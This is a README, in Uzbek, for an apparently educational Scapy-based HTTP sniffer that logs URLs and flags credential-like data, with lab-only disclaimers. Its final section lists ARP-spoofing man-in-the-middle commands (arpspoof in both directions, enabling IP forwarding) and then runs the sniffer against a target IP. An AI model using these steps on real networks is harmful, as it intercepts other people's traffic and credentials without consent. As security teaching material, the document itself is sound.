# HTTP Packet Sniffer (Educational Project)

## 📌 Loyihaning tavsifi
Ushbu loyiha **Python (Scapy)** yordamida yozilgan **HTTP packet sniffer** bo‘lib, tarmoq orqali o‘tayotgan **faqat HTTP (port 80)** so‘rovlarini aniqlash va log qilish uchun mo‘ljallangan.

Loyiha **o‘quv va test (lab) muhitlari** uchun yaratilgan bo‘lib, real tarmoqlarda ruxsatsiz foydalanish **taqiqlanadi**.

---

## ⚙️ Qanday ishlaydi?
Sniffer quyidagi prinsip asosida ishlaydi:

- Belgilangan **Target IP** manzildan chiqayotgan trafik kuzatiladi
- Faqat **HTTP so‘rovlari (GET/POST)** aniqlanadi
- URL (Host + Path) log faylga yoziladi
- Agar HTTP payload ichida login/parolga o‘xshash ma’lumotlar aniqlansa, alohida qayd etiladi

📌 **Muhim:**  
Ushbu dastur **HTTPS (443)** trafikni tahlil qilmaydi.

---

## 🧪 Test muhiti va foydalanish shartlari
Sniffer to‘g‘ridan-to‘g‘ri boshqa qurilma trafikini ko‘ra olmaydi. Shu sababli test muhitida:

- Qurilmalar bir xil **Local Area Network (LAN)** ichida bo‘lishi kerak
- Avval **MITM (Man-in-the-Middle)** holati yaratiladi
- Test maqsadida **ARP Spoofing** usuli qo‘llaniladi
- Shundan so‘ng sniffer orqali HTTP trafik kuzatiladi

⚠️ **Eslatma:**  
ARP spoofing va packet sniffing **faqat ruxsat berilgan test muhitida** amalga oshirilishi lozim.

---

## 🚫 Cheklovlar
- ❌ HTTPS trafik tahlil qilinmaydi
- ❌ Shifrlangan ma’lumotlar ko‘rinmaydi
- ❌ Real tarmoqlarda ruxsatsiz ishlatish mumkin emas

---

## 📝 Loglash
- Barcha aniqlangan HTTP so‘rovlar log faylga yoziladi
- Terminaldagi rangli chiqish log faylda toza matn ko‘rinishida saqlanadi

---

## 📚 Texnologiyalar
- Python 3
- Scapy
- argparse
- Linux (Kali Linux test muhitida sinovdan o‘tkazilgan)

---

## ⚖️ Mas’uliyat
Ushbu loyiha **faqat ta’limiy maqsadlar** uchun mo‘ljallangan.  
Muallif loyiha noto‘g‘ri yoki noqonuniy maqsadlarda ishlatilishi uchun javobgar emas.

---

## Hujumni amalga oshirish
Dastlab qiladigan ishimiz ARP-spoofing hujumini amalga oshirish bo'ldi.
Buning uchun Kali Linux da or'natilgan **arpspoof** dasturidan foydalandim yoki o'zim yozib chiqqan https://github.com/UZinfosec404/ARP-spoofing
dasturidan foydalanishingiz mumkin.
1-qadam.Yangi terminalda quyidagi kod ni ishga tushurasiz.
```
arpspoof -i eth0 -t target_ip router_ip 
```
2-qadam.Bu kodni ham yangi terminalda ishga tushurasiz.
```
arpspoof -i eth0 -t router_ip target_ip
```
3-qadam.Agar hujum qilayotgan mashinada internet uzulib qolishi mumkin shuning uchun kelayotgan packetlarni yo'naltirish lozim
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
4-qadam. Sniffer_packet dasturini ishga tushurish.Ishga tushurish uchun root huquqi talab qilinadi.
```
python3 sniffer_packet2.py -h                                                                                                                                                                                                          
usage: sniffer_packet2.py [-h] -t TARGET -i INTERFACE

HTTP Packet Sniffer (faqat lab/test muhitida)

options:
  -h, --help            show this help message and exit
  -t, --target TARGET   Target IP manzil (masalan: 192.168.1.10)
  -i, --interface INTERFACE
                        Tarmoq interfeysi (masalan: eth0, wlan0)
```
Biz quyidagicha argumentlarni dasturga kiritamiz:
```
python3 sniffer_packet2.py -t 10.236.108.83 -i wlan0
```


